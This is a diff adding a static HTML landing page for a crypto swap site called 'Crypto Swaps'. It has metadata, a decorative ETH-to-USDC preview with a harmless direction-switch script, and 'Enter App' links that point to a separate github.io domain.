@@ -1,1 +1,114 @@
-g
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Crypto Swaps</title>
+  <meta name="description" content="Crypto Swaps lets you swap tokens from your own wallet with a preview-only route before you enter the app.">
+  <link rel="canonical" href="https://crypto-swaps.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#07100D">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Crypto Swaps">
+  <meta property="og:description" content="Crypto Swaps lets you swap tokens from your own wallet with a preview-only route before you enter the app.">
+  <meta property="og:url" content="https://crypto-swaps.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Crypto Swaps">
+  <meta name="twitter:description" content="Crypto Swaps lets you swap tokens from your own wallet with a preview-only route before you enter the app.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://crypto-swaps.github.io/#website",
+        "url": "https://crypto-swaps.github.io/",
+        "name": "Crypto Swaps",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://crypto-swaps.github.io/#organization",
+        "name": "Crypto Swaps",
+        "url": "https://crypto-swaps.github.io/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://crypto-swaps.github.io/#app",
+        "name": "Crypto Swaps",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://crypto-swaps.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Crypto Swaps home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Crypto Swaps</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">Ethereum DeFi</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Crypto Swaps">
+      <h1>Crypto Swaps</h1>
+      <p class="value"><strong>Crypto Swaps</strong> lets you swap tokens from your own wallet with a preview-only route before you enter the app.</p>
+    </section>
+
+    <section class="app-card" aria-label="Swap preview">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="eth.png" width="30" height="30" alt="ETH">
+            <span class="symbol">ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
+            <span class="symbol">USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+      <p class="note">Preview only</p>
+    </section>
+  </main>
+
+  <footer class="foot">Crypto Swaps &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function(){
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
